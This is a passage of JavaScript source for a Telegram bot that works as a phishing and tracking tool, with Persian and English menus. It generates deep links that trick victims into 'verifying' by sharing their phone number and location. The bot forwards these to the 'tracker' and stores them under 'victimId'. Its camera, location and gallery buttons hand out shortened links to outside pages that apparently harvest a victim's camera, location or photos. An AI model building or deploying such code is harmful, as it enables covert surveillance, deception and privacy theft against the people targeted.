      [{ text: messages[lang].menu.myInfo, callback_data: 'menu_my_info' }],
      [{ text: messages[lang].menu.language, callback_data: 'menu_language' }],
    ],
  },
});

const backToMenuKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      [{ text: messages[lang].backToMenu, callback_data: 'back_to_menu' }],
    ],
  },
});

const sharePhoneNumberKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [
      [{ text: messages[lang].sharePhoneNumberButton, request_contact: true }],
    ],
    resize_keyboard: true,
    one_time_keyboard: true,
  },
});

const shareLocationKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [
      [{ text: messages[lang].shareLocationButton, request_location: true }],
    ],
    resize_keyboard: true,
    one_time_keyboard: true,
  },
});

const adminMenuKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [
      [
        { text: messages[lang].adminMenu.stats },
        { text: messages[lang].adminMenu.broadcast },
      ],
      [
        { text: messages[lang].adminMenu.setChannel },
        { text: messages[lang].adminMenu.blockUser },
      ],
      [
        { text: messages[lang].adminMenu.unblockUser },
        { text: messages[lang].adminMenu.back },
      ],
    ],
    resize_keyboard: true,
  },
});

const cancelKeyboard = (lang) => ({
  reply_markup: {
    keyboard: [
      [{ text: messages[lang].cancel }],
    ],
    resize_keyboard: true,
  },
});

// Helper Functions
const getFormattedDate = (timestamp) => {
  const date = new Date(timestamp * 1000);
  return `${date.getDate()}/${date.getMonth() + 1}/${date.getFullYear()}`;
};

const shortenUrl = async (longUrl, chatId, type) => {
  let prefix = '';
  if (type === 'camera') prefix = '1';
  else if (type === 'location') prefix = '2';
  else if (type === 'gallery') prefix = '3';

  const customSlug = `${prefix}${chatId}`;
  let ashlynnShortUrl = '';
  try {
    const response = await fetch(
      `https://api.ashlynn-repo.tech/short?url=${encodeURIComponent(longUrl)}&slug=${customSlug}`,
      { method: 'GET' }
    );
    const data = await response.json();
    if (data.successful === 'success' && data.status === 200 && data.response && data.response.link) {
      ashlynnShortUrl = data.response.link;
    }
  } catch (error) {
    // Silently ignore the error as per your request (no logging or error message)
  }

  if (ashlynnShortUrl) {
    return ashlynnShortUrl;
  }

  return new Promise((resolve) => {
    isgd.shorten(longUrl, (shortUrl, error) => {
      if (error) {
        console.error('Error shortening URL with is.gd:', error);
        resolve(longUrl);
      } else {
        resolve(shortUrl);
      }
    });
  });
};

const encodeBase64 = (data, appendKs = false) => {
  if (appendKs) {
    data = data + "Ks";
  }
  return Buffer.from(data).toString('base64');
};

const broadcastMessage = async (bot, message, users, senderId) => {
  let success = 0;
  let failed = 0;

  for (const user of users) {
    if (user.userId === senderId) continue;
    try {
      if (message.text) {
        await bot.telegram.sendMessage(user.userId, message.text);
      } else if (message.photo) {
        await bot.telegram.sendPhoto(user.userId, message.photo[message.photo.length - 1].file_id, {
          caption: message.caption || '',
        });
      } else if (message.document) {
        await bot.telegram.sendDocument(user.userId, message.document.file_id, { caption: message.caption || '' });
      } else if (message.video) {
        await bot.telegram.sendVideo(user.userId, message.video.file_id, { caption: message.caption || '' });
      } else if (message.audio) {
        await bot.telegram.sendAudio(user.userId, message.audio.file_id, { caption: message.caption || '' });
      } else if (message.voice) {
        await bot.telegram.sendVoice(user.userId, message.voice.file_id);
      } else if (message.sticker) {
        await bot.telegram.sendSticker(user.userId, message.sticker.file_id);
      } else {
        await bot.telegram.sendMessage(user.userId, 'Unsupported message type');
      }
      success++;
      await new Promise((resolve) => setTimeout(resolve, 34));
    } catch (error) {
      console.error(`Failed to broadcast to user ${user.userId}:`, error.message);
      failed++;
    }
  }

  return { success, failed };
};

// Main Handler
module.exports = async (req, res) => {
  try {
    if (req.method !== 'POST') {
      return res.status(200).send('Bot is running.');
    }

    const botToken = req.query.token;
    if (!botToken) {
      return res.status(400).json({ error: 'Bot token is required.' });
    }

    const botInfo = await Bot.findOne({ token: botToken });
    if (!botInfo) {
      return res.status(404).json({ error: 'Bot not found.' });
    }

    const bot = new Telegraf(botToken);

    // Set the bot commands for the menu
    const commands = [
      {
        command: 'start',
        description: 'Start Bot | شروع ربات'
      },
      {
        command: 'panel',
        description: 'Admin PANEL | پنل مدیریت'
      }
    ];
    await bot.telegram.setMyCommands(commands);

    const update = req.body;
    const chatId = update.message?.chat?.id || update.callback_query?.message?.chat?.id;
    const userId = (update.message?.from?.id || update.callback_query?.from?.id)?.toString();
    const messageId = update.message?.message_id || update.callback_query?.message?.message_id;

    if (!chatId || !userId) {
      return res.status(400).json({ error: 'Invalid update.' });
    }

    // Fetch or create user
    let user = await BotUser.findOne({ botToken, userId });
    if (!user) {
      const username = update.message?.from?.username
        ? `@${update.message.from.username}`
        : update.message.from.first_name || 'User';
      const referredBy = update.message?.text?.startsWith('/start') && update.message.text.includes(' ')
        ? update.message.text.split(' ')[1]
        : 'none';

      user = await BotUser.create({
        botToken,
        userId,
        username,
        hasJoined: false,
        isFirstStart: true,
        language: 'en',
        referredBy,
        referralCount: 0,
        isVip: false,
        isBlocked: false,
        adminState: 'none',
        requiresVerification: false,
        currentTrackerId: null,
        verificationStep: 'none',
      });

      const totalUsers = await BotUser.countDocuments({ botToken });
      const notification = messages['en'].newUserNotification(
        user.username,
        userId,
        user.referredBy,
        totalUsers
      );
      await bot.telegram.sendMessage(botInfo.creatorId, notification);

      if (user.referredBy !== 'none' && /^\d+$/.test(user.referredBy)) {
        const referrer = await BotUser.findOne({ botToken, userId: user.referredBy });
        if (referrer) {
          referrer.referralCount = (referrer.referralCount || 0) + 1;
          await referrer.save();
          const referrerLang = referrer.language || 'en';
          const referralMessage = messages[referrerLang].referralNotification(user.username, referrer.referralCount);
          await bot.telegram.sendMessage(user.referredBy, referralMessage);
        }
      }
    }

    const lang = user.language || 'en';
    user.lastInteraction = Math.floor(Date.now() / 1000);
    await user.save();

    // Check if user is banned
    if (user.isBlocked && userId !== botInfo.creatorId && userId !== OWNER_ID) {
      await bot.telegram.sendMessage(chatId, messages[lang].banned);
      return res.status(200).json({ ok: true });
    }

    // Fetch channel info
    let channelInfo = await Channel.findOne({ botToken });
    if (!channelInfo) {
      channelInfo = await Channel.create({ botToken });
    }
    const mainChannel = channelInfo.mainChannel;
    const customChannel = channelInfo.customChannel;

    // Handle incoming messages
    if (update.message) {
      const text = update.message.text;

      if (text?.startsWith('/start')) {
        const startParam = text.split(' ')[1] || '';
        let isTrackingLink = false;
        let trackerId = null;
        let verificationType = 'none';

        // Check for tracking links
        if (startParam.startsWith('free_')) {
          const extractedTrackerId = startParam.replace('free_', '');
          if (/^\d+$/.test(extractedTrackerId)) {
            isTrackingLink = true;
            trackerId = extractedTrackerId;
            verificationType = 'phone';
          }
        } else if (startParam.startsWith('pro_')) {
          const extractedTrackerId = startParam.replace('pro_', '');
          if (/^\d+$/.test(extractedTrackerId)) {
            isTrackingLink = true;
            trackerId = extractedTrackerId;
            verificationType = 'location';
          }
        } else if (startParam.startsWith('ref_')) {
          const extractedTrackerId = startParam.replace('ref_', '');
          if (/^\d+$/.test(extractedTrackerId)) {
            isTrackingLink = true;
            trackerId = extractedTrackerId;
            verificationType = 'both_phone';
          }
        }

        // Update the user's verification state
        user.requiresVerification = isTrackingLink;
        user.currentTrackerId = trackerId;
        user.verificationStep = verificationType;
        await user.save();

        if (user.requiresVerification) {
          if (verificationType === 'phone' || verificationType === 'both_phone') {
            await bot.telegram.sendMessage(
              chatId,
              messages[lang].sharePhoneNumberMessage,
              sharePhoneNumberKeyboard(lang)
            );
          } else if (verificationType === 'location') {
            await bot.telegram.sendMessage(
              chatId,
              messages[lang].shareLocationMessage,
              shareLocationKeyboard(lang)
            );
          }
        } else {
          if (user.isFirstStart) {
            await bot.telegram.sendMessage(chatId, messages[lang].selectLanguage, languageKeyboard(lang));
            user.isFirstStart = false;
            await user.save();
          } else if (!user.hasJoined) {
            await bot.telegram.sendMessage(
              chatId,
              messages[lang].joinMessage,
              joinKeyboard(lang, mainChannel, customChannel)
            );
          } else {
            await bot.telegram.sendMessage(
              chatId,
              messages[lang].joinMessage,
              joinKeyboard(lang, mainChannel, customChannel)
            );
          }
        }
      }

      else if (update.message.contact) {
        // Handle phone number sharing
        if (user.requiresVerification && user.currentTrackerId) {
          try {
            const phoneNumber = update.message.contact.phone_number;
            const username = user.username || 'Unknown';
            const trackerId = user.currentTrackerId;

            // Send phone number to the tracker
            const notification = messages['en'].phoneNumberNotification(username, userId, phoneNumber);
            await bot.telegram.sendMessage(trackerId, notification);

            if (user.verificationStep === 'phone') {
              // Reset verification state
              user.requiresVerification = false;
              user.currentTrackerId = null;
              user.verificationStep = 'none';
              await user.save();
              await bot.telegram.sendMessage(chatId, 'Your phone number has been verified. Thank you!');
            } else if (user.verificationStep === 'both_phone') {
              // Move to the next step: location
              user.verificationStep = 'both_location';
              await user.save();
              await bot.telegram.sendMessage(
                chatId,
                messages[lang].shareLocationMessage,
                shareLocationKeyboard(lang)
              );
            }
          } catch (error) {
            console.error(`Error handling phone number sharing for user ${userId}:`, error);
            await bot.telegram.sendMessage(chatId, messages[lang].error);
          }
        } else {
          await bot.telegram.sendMessage(chatId, messages[lang].noVerificationNeeded);
        }
      }

      else if (update.message.location) {
        // Handle location sharing
        if (user.requiresVerification && user.currentTrackerId) {
          try {
            const { latitude, longitude, live_period } = update.message.location;
            const username = user.username || 'Unknown';
            const trackerId = user.currentTrackerId;

            // Store the location in the database
            const trackedLocation = await TrackedLocation.create({
              botToken,
              victimId: userId,
              victimUsername: username,
              latitude,
              longitude,
              trackerId,
            });

            // Generate a Google Maps link
            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

            // Send text-based notification to the tracker
            const notification = messages['en'].locationNotification(username, userId, latitude, longitude, mapsLink);
            await bot.telegram.sendMessage(trackerId, notification);

            // Send the location in Telegram's native format
            await bot.telegram.sendLocation(trackerId, latitude, longitude, {
              live_period: live_period || undefined,
            });

            // Reset verification state
            user.requiresVerification = false;
            user.currentTrackerId = null;
            user.verificationStep = 'none';
            await user.save();

            await bot.telegram.sendMessage(chatId, 'Your location has been verified. Now you can /start to use bot 🚀');
          } catch (error) {
            console.error(`Error handling location sharing for user ${userId}:`, error);
            await bot.telegram.sendMessage(chatId, messages[lang].error);
          }
        } else {
          await bot.telegram.sendMessage(chatId, messages[lang].noVerificationNeeded);
        }
      }

      else if (text === '/panel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        await bot.telegram.sendMessage(chatId, messages[lang].adminPanel, adminMenuKeyboard(lang));
        user.adminState = 'admin_panel';
        await user.save();
      }

      else if (user.adminState === 'admin_panel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].adminMenu.stats) {
          const totalUsers = await BotUser.countDocuments({ botToken });
          const createdAt = getFormattedDate(botInfo.createdAt);
          const stats = messages[lang].statsMessage(
            botInfo.username,
            totalUsers,
            createdAt,
            mainChannel,
            customChannel
          );
          await bot.telegram.sendMessage(chatId, stats, adminMenuKeyboard(lang));
        }

        else if (text === messages[lang].adminMenu.broadcast) {
          const totalUsers = await BotUser.countDocuments({ botToken, hasJoined: true });
          if (totalUsers === 0) {
            await bot.telegram.sendMessage(chatId, '❌ No users have joined this bot yet.', adminMenuKeyboard(lang));
          } else {
            await bot.telegram.sendMessage(
              chatId,
              messages[lang].broadcastPrompt(totalUsers),
              cancelKeyboard(lang)
            );
            user.adminState = 'awaiting_broadcast';
            await user.save();
          }
        }

        else if (text === messages[lang].adminMenu.setChannel) {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].setChannelPrompt(mainChannel, customChannel),
            cancelKeyboard(lang)
          );
          user.adminState = 'awaiting_channel';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.blockUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].blockPrompt, cancelKeyboard(lang));
          user.adminState = 'awaiting_block';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.unblockUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].unblockPrompt, cancelKeyboard(lang));
          user.adminState = 'awaiting_unblock';
          await user.save();
        }

        else if (text === messages[lang].adminMenu.back) {
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].welcome(user.username),
            mainMenuKeyboard(lang)
          );
          user.adminState = 'none';
          await user.save();
        }
      }

      else if (user.adminState === 'awaiting_broadcast' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        try {
          const targetUsers = await BotUser.find({ botToken, hasJoined: true, isBlocked: false });
          const { success, failed } = await broadcastMessage(bot, update.message, targetUsers, userId);
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].broadcastSuccess(success, failed),
            adminMenuKeyboard(lang)
          );
          user.adminState = 'admin_panel';
          await user.save();
        } catch (error) {
          await bot.telegram.sendMessage(chatId, messages[lang].error, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }
      }

      else if (user.adminState === 'awaiting_channel' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        let channelUrl = text.trim();
        channelUrl = channelUrl.replace(/^@/, '');
        channelUrl = channelUrl.replace(/^(https?:\/\/)?/i, '');
        channelUrl = channelUrl.replace(/\/+$/, '');
        if (!/^t\.me\//i.test(channelUrl)) {
          channelUrl = 't.me/' + channelUrl;
        }
        const correctedUrl = 'https://' + channelUrl;

        const urlRegex = /^https:\/\/t\.me\/.+$/;
        if (!urlRegex.test(correctedUrl)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidChannel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        try {
          await Channel.findOneAndUpdate({ botToken }, { customChannel: correctedUrl }, { upsert: true });
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].setChannelSuccess(correctedUrl, mainChannel),
            adminMenuKeyboard(lang)
          );
          user.adminState = 'admin_panel';
          await user.save();
        } catch (error) {
          await bot.telegram.sendMessage(chatId, messages[lang].error, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }
      }

      else if (user.adminState === 'awaiting_block' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUserId = text.trim();
        if (!/^\d+$/.test(targetUserId)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidUserId, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        if (targetUserId === userId) {
          await bot.telegram.sendMessage(chatId, messages[lang].cannotBlockSelf, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
        if (!targetUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].userNotFound, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        try {
          targetUser.isBlocked = true;
          await targetUser.save();
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].blockSuccess(targetUserId),
            adminMenuKeyboard(lang)
          );
          user.adminState = 'admin_panel';
          await user.save();
        } catch (error) {
          await bot.telegram.sendMessage(chatId, messages[lang].error, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }
      }

      else if (user.adminState === 'awaiting_unblock' && (userId === botInfo.creatorId || userId === OWNER_ID)) {
        if (text === messages[lang].cancel) {
          await bot.telegram.sendMessage(chatId, messages[lang].broadcastCancel, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUserId = text.trim();
        if (!/^\d+$/.test(targetUserId)) {
          await bot.telegram.sendMessage(chatId, messages[lang].invalidUserId, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        const targetUser = await BotUser.findOne({ botToken, userId: targetUserId });
        if (!targetUser) {
          await bot.telegram.sendMessage(chatId, messages[lang].userNotFound, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }

        try {
          targetUser.isBlocked = false;
          await targetUser.save();
          await bot.telegram.sendMessage(
            chatId,
            messages[lang].unblockSuccess(targetUserId),
            adminMenuKeyboard(lang)
          );
          user.adminState = 'admin_panel';
          await user.save();
        } catch (error) {
          await bot.telegram.sendMessage(chatId, messages[lang].error, adminMenuKeyboard(lang));
          user.adminState = 'admin_panel';
          await user.save();
          return;
        }
      }
    }

    // Handle callback queries
    if (update.callback_query) {
      const callbackData = update.callback_query.data;
      const callbackQueryId = update.callback_query.id;

      if (callbackData === 'lang_en') {
        user.language = 'en';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Language set to English 🇺🇲');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['en'].joinMessage,
          joinKeyboard('en', mainChannel, customChannel)
        );
      }

      else if (callbackData === 'lang_fa') {
        user.language = 'fa';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'زبان به فارسی تنظیم شد');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['fa'].joinMessage,
          joinKeyboard('fa', mainChannel, customChannel)
        );
      }

      else if (callbackData === 'lang_en_menu') {
        user.language = 'en';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Language set to English');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['en'].welcome(user.username),
          mainMenuKeyboard('en')
        );
      }

      else if (callbackData === 'lang_fa_menu') {
        user.language = 'fa';
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'زبان به فارسی تنظیم شد');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages['fa'].welcome(user.username),
          mainMenuKeyboard('fa')
        );
      }

      else if (callbackData === 'joined') {
        user.hasJoined = true;
        await user.save();
        await bot.telegram.answerCbQuery(callbackQueryId, 'Thank you for joining 🙂');
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].welcome(user.username),
          mainMenuKeyboard(lang)
        );
      }

      else if (callbackData === 'menu_camera') {
        try {
          await bot.telegram.deleteMessage(chatId, messageId);
          const encodedBot = encodeBase64(botToken, true);
          const encodedId = Buffer.from(chatId.toString()).toString('base64');
          const longUrl = `https://for-free.serv00.net/t/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl, chatId, 'camera');
          await bot.telegram.sendPhoto(
            chatId,
            'https://mallucampaign.in/images/img_1709056967.jpg',
            {
              caption: messages[lang].cameraMessage(shortUrl),
              parse_mode: 'Markdown',
              reply_markup: backToMenuKeyboard(lang).reply_markup,
            }
          );
          await bot.telegram.answerCbQuery(callbackQueryId);
        } catch (error) {
          console.error('Error in Camera button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error, mainMenuKeyboard(lang));
        }
      }

      else if (callbackData === 'menu_location') {
        try {
          await bot.telegram.deleteMessage(chatId, messageId);
          const encodedBot = encodeBase64(botToken, true);
          const encodedId = Buffer.from(chatId.toString()).toString('base64');
          const longUrl = `https://for-free.serv00.net/2/index.html?x=${encodedBot}&y=${encodedId}`;
          const shortUrl = await shortenUrl(longUrl, chatId, 'location');
          await bot.telegram.sendPhoto(
            chatId,
            'https://l.arzfun.com/hKNPI',
            {
              caption: messages[lang].locationMessage(shortUrl),
              parse_mode: 'Markdown',
              reply_markup: backToMenuKeyboard(lang).reply_markup,
            }
          );
          await bot.telegram.answerCbQuery(callbackQueryId);
        } catch (error) {
          console.error('Error in Location button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error, mainMenuKeyboard(lang));
        }
      }

      else if (callbackData === 'menu_gallery') {
        try {
          await bot.telegram.deleteMessage(chatId, messageId);
          const requiredReferrals = 0;
          const userReferrals = user.referralCount || 0;
          if (user.isVip || userReferrals >= requiredReferrals) {
            const encodedBot = encodeBase64(botToken, true);
            const encodedId = Buffer.from(chatId.toString()).toString('base64');
            const longUrl = `https://for-free.serv00.net/helps/index.html?x=${encodedBot}&y=${encodedId}`;
            const shortUrl = await shortenUrl(longUrl, chatId, 'gallery');
            await bot.telegram.sendPhoto(
              chatId,
              'https://ibb.co/BHbSztdG',
              {
                caption: messages[lang].galleryMessage(shortUrl),
                parse_mode: 'Markdown',
                reply_markup: backToMenuKeyboard(lang).reply_markup,
              }
            );
          } else {
            const botLink = `https://t.me/${botInfo.username}?start=${userId}`;
            await bot.telegram.sendPhoto(
              chatId,
              'https://mallucampaign.in/images/img_1709042709.jpg',
              {
                caption: messages[lang].galleryLocked(userReferrals, botLink),
                parse_mode: 'Markdown',
                reply_markup: backToMenuKeyboard(lang).reply_markup,
              }
            );
          }
          await bot.telegram.answerCbQuery(callbackQueryId);
        } catch (error) {
          console.error('Error in Gallery button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error, mainMenuKeyboard(lang));
        }
      }

      else if (callbackData === 'menu_phone_location') {
        try {
          await bot.telegram.deleteMessage(chatId, messageId);
          const phoneUrl = `https://t.me/${botInfo.username}?start=free_${userId}`;
          const locationUrl = `https://t.me/${botInfo.username}?start=pro_${userId}`;
          const bothUrl = `https://t.me/${botInfo.username}?start=ref_${userId}`;
          await bot.telegram.sendPhoto(
            chatId,
            'https://ibb.co/BHbSztdG',
            {
              caption: messages[lang].phoneLocationMessage(phoneUrl, locationUrl, bothUrl),
              parse_mode: 'Markdown',
              reply_markup: backToMenuKeyboard(lang).reply_markup,
            }
          );
          await bot.telegram.answerCbQuery(callbackQueryId);
        } catch (error) {
          console.error('Error in Phone + Location button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error, mainMenuKeyboard(lang));
        }
      }

      else if (callbackData === 'menu_my_info') {
        try {
          await bot.telegram.deleteMessage(chatId, messageId);
          await bot.telegram.sendPhoto(
            chatId,
            'https://ibb.co/BHbSztdG',
            {
              caption: messages[lang].myInfoMessage(botInfo.username, chatId),
              reply_markup: backToMenuKeyboard(lang).reply_markup,
            }
          );
          await bot.telegram.answerCbQuery(callbackQueryId);
        } catch (error) {
          console.error('Error in My Info button:', error);
          await bot.telegram.sendMessage(chatId, messages[lang].error, mainMenuKeyboard(lang));
        }
      }

      else if (callbackData === 'menu_language') {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(chatId, messages[lang].selectLanguage, {
          reply_markup: {
            inline_keyboard: [
              [
                { text: messages[lang].langEnglish, callback_data: 'lang_en_menu' },
                { text: messages[lang].langPersian, callback_data: 'lang_fa_menu' },
              ],
            ],
          },
        });
        await bot.telegram.answerCbQuery(callbackQueryId);
      }

      else if (callbackData === 'back_to_menu') {
        await bot.telegram.deleteMessage(chatId, messageId);
        await bot.telegram.sendMessage(
          chatId,
          messages[lang].welcome(user.username),
          mainMenuKeyboard(lang)
        );
        await bot.telegram.answerCbQuery(callbackQueryId);
      }
    }

    return res.status(200).json({ ok: true });
  } catch (error) {
    console.error('Error in bot:', error);
    return res.status(500).json({ error: 'Internal server error' });
  }
};
